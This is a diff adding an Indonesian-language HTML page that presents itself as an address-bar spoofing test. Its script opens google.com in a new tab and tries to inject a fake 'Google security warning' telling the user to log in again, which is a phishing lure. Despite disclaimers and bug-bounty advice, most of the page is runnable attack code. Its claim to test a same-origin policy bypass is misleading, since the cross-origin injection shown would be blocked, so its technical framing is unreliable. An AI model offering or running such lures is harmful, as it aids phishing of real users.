@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengujian Keamanan - Spoofing Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .test-area {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            border: 1px solid #dee2e6;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .code-block {
+            background-color: #f4f4f4;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: monospace;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h3>⚠ PERINGATAN PENTING - PENGUJIAN KEAMANAN SAJA</h3>
+        <p><strong>Script ini hanya untuk:</strong></p>
+        <ul>
+            <li>Pengujian keamanan sistem Anda sendiri</li>
+            <li>Program bug bounty dengan izin tertulis</li>
+            <li>Edukasi tentang kerentanan address bar spoofing</li>
+        </ul>
+        <p><strong>JANGAN gunakan untuk tujuan jahat atau tanpa izin!</strong></p>
+    </div>
+
+    <h1>Pengujian Address Bar Spoofing dengan Alert Delay</h1>
+    <p>Script ini akan membuka tab baru menuju Google.com, kemudian setelah 5 detik akan muncul alert yang seolah-olah berasal dari Google.</p>
+
+    <div class="test-area">
+        <h2>Demonstrasi Teknik:</h2>
+        <ol>
+            <li>Klik tombol di bawah untuk membuka tab baru ke Google</li>
+            <li>Tab baru akan terbuka dengan URL: <code>https://www.google.com</code></li>
+            <li>Setelah 5 detik, alert akan muncul di tab tersebut</li>
+            <li>Perhatikan bahwa alert muncul di konteks Google.com</li>
+        </ol>
+
+        <button onclick="runSpoofingTest()">🚀 Jalankan Test Spoofing</button>
+        
+        <div id="status"></div>
+    </div>
+
+    <h2>Mekanisme Teknis:</h2>
+    <div class="code-block">
+// 1. Membuka tab baru ke Google
+var newWindow = window.open("https://www.google.com", "_blank");
+
+// 2. Setelah 5 detik, injeksikan script untuk alert
+setTimeout(function() {
+    try {
+        // Manipulasi DOM di tab baru
+        var script = newWindow.document.createElement('script');
+        script.textContent = `
+            alert("⚠ PERINGATAN KEAMANAN GOOGLE!\\n\\nAkun Anda memerlukan verifikasi ulang.\\nHarap login kembali untuk melanjutkan.");
+        `;
+        newWindow.document.body.appendChild(script);
+        
+        // Alternatif: Redirect setelah alert
+        setTimeout(function() {
+            newWindow.location.href = "https://www.google.com";
+        }, 3000);
+        
+    } catch(e) {
+        console.log("Proteksi browser aktif:", e.message);
+    }
+}, 5000); // Delay 5 detik
+    </div>
+
+    <h2>Poin Pengujian Keamanan:</h2>
+    <ul>
+        <li>✅ <strong>Same-origin policy bypass:</strong> Cek apakah alert bisa muncul di konteks domain lain</li>
+        <li>✅ <strong>User perception:</strong> Pengguna melihat URL Google tetapi konten dimanipulasi</li>
+        <li>✅ <strong>Timing attack:</strong> Delay membuat pengguna kurang waspada</li>
+        <li>✅ <strong>Browser protection:</strong> Uji apakah browser modern memblokir manipulasi ini</li>
+    </ul>
+
+    <h2>Metode Pelaporan Bug Bounty:</h2>
+    <p>Jika menemukan kerentanan ini di situs web dengan program bug bounty:</p>
+    <ol>
+        <li>Rekam video seluruh proses</li>
+        <li>Tangkap screenshot sebelum dan sesudah alert</li>
+        <li>Catat browser dan versi yang digunakan</li>
+        <li>Jelaskan dampak potensial (phishing, social engineering)</li>
+        <li>Sarankan mitigasi (CSP, sandbox attributes, dll)</li>
+    </ol>
+
+    <script>
+        function runSpoofingTest() {
+            const status = document.getElementById('status');
+            status.innerHTML = '<p style="color: #28a745;">⏳ Membuka tab baru ke Google.com...</p>';
+            
+            try {
+                // 1. Buka tab baru ke Google
+                var newWindow = window.open("https://www.google.com", "_blank", "width=800,height=600");
+                
+                if (!newWindow) {
+                    status.innerHTML = '<p style="color: #dc3545;">❌ Popup diblokir oleh browser. Izinkan popup untuk melanjutkan test.</p>';
+                    return;
+                }
+                
+                status.innerHTML += '<p style="color: #28a745;">✅ Tab baru terbuka. Tunggu 5 detik...</p>';
+                
+                // 2. Setelah 5 detik, injeksikan alert
+                setTimeout(function() {
+                    try {
+                        status.innerHTML += '<p style="color: #28a745;">⏳ Mencoba injeksi script...</p>';
+                        
+                        // Coba manipulasi DOM di tab baru
+                        if (newWindow.closed) {
+                            status.innerHTML += '<p style="color: #dc3545;">❌ Tab baru ditutup oleh pengguna/browser.</p>';
+                            return;
+                        }
+                        
+                        // Create and inject script element
+                        var script = newWindow.document.createElement('script');
+                        script.textContent = `
+                            // Alert yang seolah-olah dari Google
+                            alert("⚠ PERINGATAN KEAMANAN GOOGLE!\\n\\nAkun Anda memerlukan verifikasi ulang.\\nHarap login kembali untuk melanjutkan.\\n\\nIni adalah DEMO pengujian keamanan saja.");
+                            
+                            // Log untuk debugging
+                            console.log("Alert dari domain: " + window.location.hostname);
+                        `;
+                        
+                        newWindow.document.body.appendChild(script);
+                        status.innerHTML += '<p style="color: #28a745;">✅ Script diinjeksikan. Alert akan muncul!</p>';
+                        
+                        // Reset halaman setelah alert
+                        setTimeout(function() {
+                            if (!newWindow.closed) {
+                                newWindow.location.href = "https://www.google.com";
+                                status.innerHTML += '<p style="color: #28a745;">✅ Tab direset ke halaman Google asli.</p>';
+                            }
+                        }, 4000);
+                        
+                    } catch(e) {
+                        status.innerHTML += `<p style="color: #dc3545;">❌ Error: ${e.name} - ${e.message}</p>`;
+                        status.innerHTML += '<p style="color: #ffc107;">ℹ️ Browser mungkin memiliki proteksi CORS/SOP yang aktif.</p>';
+                    }
+                }, 5000); // Delay 5 detik
+                
+            } catch(e) {
+                status.innerHTML = `<p style="color: #dc3545;">❌ Error membuka window: ${e.message}</p>`;
+            }
+        }
+
+        // Versi alternatif untuk testing CORS
+        function testCORSVersion() {
+            var testWindow = window.open("", "_blank");
+            testWindow.document.write(`
+                <html>
+                <head><title>Test Page</title></head>
+                <body>
+                    <h1>Halaman Test Internal</h1>
+                    <script>
+                        setTimeout(function() {
+                            alert("Test alert dari halaman internal");
+                        }, 5000);
+                    <\/script>
+                </body>
+                </html>
+            `);
+            testWindow.document.close();
+        }
+    </script>
+
+    <div class="warning" style="margin-top: 30px;">
+        <h3>📝 DISCLAIMER LEGAL</h3>
+        <p>Script ini disediakan <strong>HANYA UNTUK TUJUAN EDUKASI DAN PENGUJIAN KEAMANAN</strong>.</p>
+        <p>Penggunaan terhadap sistem/orang tanpa izin eksplisit adalah <strong>ILEGAL</strong>.</p>
+        <p>Penulis tidak bertanggung jawab atas penyalahgunaan script ini.</p>
+    </div>
+</body>
+</html>
